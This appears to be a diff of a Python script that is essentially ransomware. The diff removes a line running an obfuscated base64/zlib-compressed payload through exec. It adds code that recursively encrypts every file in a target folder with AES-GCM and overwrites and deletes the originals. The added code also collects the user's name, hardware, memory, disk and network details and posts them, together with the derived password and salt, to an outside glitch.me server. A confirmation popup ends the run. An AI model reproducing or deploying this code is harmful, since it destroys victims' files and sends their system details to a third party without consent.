@@ -1,4 +1,272 @@
+import os
+import secrets
+import threading
+import getpass
+import hashlib
+import tkinter as tk
+from tkinter import messagebox
+import requests
+import uuid
+import platform
+import time
+import json
+import psutil
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+SERVER_URL = 'https://respected-spiced-bobolink.glitch.me/store_data'
+
+def get_mac_address():
+    """Get the system's MAC address."""
+    mac = uuid.getnode()
+    return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
+
+def get_system_uuid():
+    """Get a stable identifier for the system."""
+    return str(uuid.getnode())
+
+def generate_user_specific_password_and_salt():
+    """Generate a unique password and salt using fixed system identifiers."""
+    user = getpass.getuser()
+    mac_address = get_mac_address()
+    system_uuid = get_system_uuid()
+
+    unique_string = f"{user}-{mac_address}-{system_uuid}-constant_value"
+    password = hashlib.sha256(unique_string.encode()).digest()
+    salt = password[:16]  # First 16 bytes of the hash as salt
+    return password, salt
+
+def load_encryption_details():
+    """Load encryption details (password and salt) from local file."""
+    if os.path.exists('encryption_details.txt'):
+        with open('encryption_details.txt', 'r') as f:
+            lines = f.readlines()
+            password = bytes.fromhex(lines[0].split(': ')[1].strip())
+            salt = bytes.fromhex(lines[1].split(': ')[1].strip())
+            return password, salt
+    return None, None
+
+def save_encryption_details(password, salt):
+    """Save encryption details (password and salt) locally."""
+    with open('encryption_details.txt', 'w') as f:
+        f.write(f'Password: {password.hex()}\n')
+        f.write(f'Salt: {salt.hex()}\n')
+
+def derive_key(password: bytes, salt: bytes) -> bytes:
+    """Derives a key from a password using PBKDF2 and returns the key."""
+    try:
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            iterations=100000,
+            length=32,
+            salt=salt,
+            backend=default_backend()
+        )
+        return kdf.derive(password)
+    except Exception as e:
+        print(f"Key derivation failed: {e}")
+        raise
+
+def generate_key():
+    """Generate a random 32-byte (256-bit) key."""
+    return secrets.token_bytes(32)
+
+def encrypt_file(key, file_path):
+    """Encrypt a file using AES-GCM."""
+    if file_path.endswith('.enc'):
+        print(f"Skipping already encrypted file: {file_path}")
+        return
+
+    iv = os.urandom(12)
+    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+
+    try:
+        with open(file_path, 'rb') as file:
+            plaintext = file.read()
+            ciphertext = encryptor.update(plaintext) + encryptor.finalize()
+
+        encrypted_file_path = file_path + '.enc'
+        with open(encrypted_file_path, 'wb') as encrypted_file:
+            encrypted_file.write(iv + encryptor.tag + ciphertext)
+
+        secure_file_delete(file_path)
+    except Exception as e:
+        print(f"Error encrypting {file_path}: {e}")
+
+def secure_file_delete(file_path):
+    """Securely delete a file by overwriting it with random data."""
+    try:
+        with open(file_path, 'r+b') as file:
+            file_size = os.path.getsize(file_path)
+            file.write(os.urandom(file_size))
+        os.remove(file_path)
+    except Exception as e:
+        print(f"Error deleting {file_path}: {e}")
+
+def encrypt_data(key, data):
+    """Encrypt data using AES-GCM."""
+    iv = os.urandom(12)
+    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+
+    encrypted_data = encryptor.update(data) + encryptor.finalize()
+
+    private_key = rsa.generate_private_key(
+        public_exponent=65537,
+        key_size=2048,
+        backend=default_backend()
+    )
+    public_key = private_key.public_key()
+
+    encrypted_key = public_key.encrypt(
+        key,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+
+    return iv + encryptor.tag + encrypted_key + encrypted_data
+
+def save_key(master_key, key_to_encrypt, key_path):
+    """Save an encrypted key securely using RSA."""
+    encrypted_key = encrypt_data(master_key, key_to_encrypt)
+
+    with open(key_path, 'wb') as key_file:
+        key_file.write(encrypted_key)
+
+def get_system_info():
+    """Gather system information."""
+    system_info = {
+        "System": platform.system(),
+        "Node Name": platform.node(),
+        "Release": platform.release(),
+        "Version": platform.version(),
+        "Machine": platform.machine(),
+        "Processor": platform.processor(),
+        "User Name": getpass.getuser(),
+        "Home Directory": os.path.expanduser("~"),
+        "CPU Count": psutil.cpu_count(),
+        "CPU Usage": psutil.cpu_percent(interval=1),
+        "Total Memory": round(psutil.virtual_memory().total / (1024 * 1024), 2),
+        "Available Memory": round(psutil.virtual_memory().available / (1024 * 1024), 2),
+        "Total Disk Space": round(psutil.disk_usage('/').total / (1024 * 1024 * 1024), 2),
+        "Used Disk Space": round(psutil.disk_usage('/').used / (1024 * 1024 * 1024), 2),
+        "Free Disk Space": round(psutil.disk_usage('/').free / (1024 * 1024 * 1024), 2),
+        "Network Interfaces": {interface: [addr.address for addr in details] for interface, details in psutil.net_if_addrs().items()},
+    }
+    
+    # Windows does not support os.getuid() and os.getgid()
+    if platform.system() != "Windows":
+        system_info["User ID"] = os.getuid()
+        system_info["Group ID"] = os.getgid()
+
+    return system_info
+
+def encrypt_all_data(key, data_source):
+    """Encrypt all files in a specified directory using multi-threading."""
+    threads = []
+    processed_files = set()
+    for root, dirs, files in os.walk(data_source):
+        for file_name in files:
+            file_path = os.path.join(root, file_name)
+            if file_path in processed_files:
+                continue
+
+            thread = threading.Thread(target=encrypt_file, args=(key, file_path))
+            thread.start()
+            threads.append(thread)
+            processed_files.add(file_path)
+
+    for thread in threads:
+        thread.join()
+
+def send_data_to_server(username, password, salt, system_info, max_retries=5):
+    """Send user data to the server with retries on failure."""
+    data = {
+        'username': username,
+        'password': password.hex(),
+        'salt': salt.hex(),
+        'system_info': system_info
+    }
+    
+    for attempt in range(max_retries):
+        try:
+            response = requests.post(SERVER_URL, json=data)
+            print("Server response:", response.json())
+            if response.status_code == 200:
+                print("Data sent successfully to the server.")
+                return
+            else:
+                print(f"Failed to send data (attempt {attempt + 1}). Server responded with: {response.status_code}, {response.text}")
+        
+        except requests.ConnectionError:
+            print(f"Connection error (attempt {attempt + 1}). Retrying...")
+        
+        except requests.Timeout:
+            print(f"Request timed out (attempt {attempt + 1}). Retrying...")
+        
+        except Exception as e:
+            print(f"An error occurred while sending data (attempt {attempt + 1}): {e}")
+        
+        time.sleep(3)
+
+    print("Failed to send data after multiple attempts.")
+    
+def display_decryption_key(key):
+    """Display the decryption key for the user."""
+    print("\nDecryption Key:")
+    print(key.hex())
+    print("\nIMPORTANT: Save this key securely for future decryption!")
+
+def show_notification(message):
+    """Show a notification message box."""
+    root = tk.Tk()
+    root.withdraw()  # Hide the main window
+    messagebox.showinfo("Encryption Complete", message)
+    root.destroy()
+
+def main():
+    home_directory = os.path.expanduser("~")
+    path = r"C:\Users\USER\Documents\Shaykhul\RockyRabbit\New folder"
+
+    # Load existing password and salt or generate new ones
+    password, salt = load_encryption_details()
+    if password is None or salt is None:
+        password, salt = generate_user_specific_password_and_salt()
+        save_encryption_details(password, salt)
+
+    key = derive_key(password, salt)
+
+    # Get the current username and system information
+    username = getpass.getuser()
+    system_info = get_system_info()
+
+    encrypted_key_path = os.path.join(home_directory, 'encrypted_key.bin')
+    master_key = generate_key()
+    save_key(master_key, key, encrypted_key_path)
+
+    encrypt_all_data(key, path)
+    
+    # Send password, salt, and system information to the server
+    send_data_to_server(username, password, salt, system_info)
+
+    sample_data = b"This is some sample data to be encrypted."
+    encrypted_data = encrypt_data(key, sample_data)
+
+    with open('encrypted_data.bin', 'wb') as encrypted_data_file:
+        encrypted_data_file.write(encrypted_data)
+
+    display_decryption_key(key)
+    
+    # Show notification after encryption is complete
+    show_notification("All files have been encrypted successfully!")
+
+if __name__ == "__main__":
+    main()
+
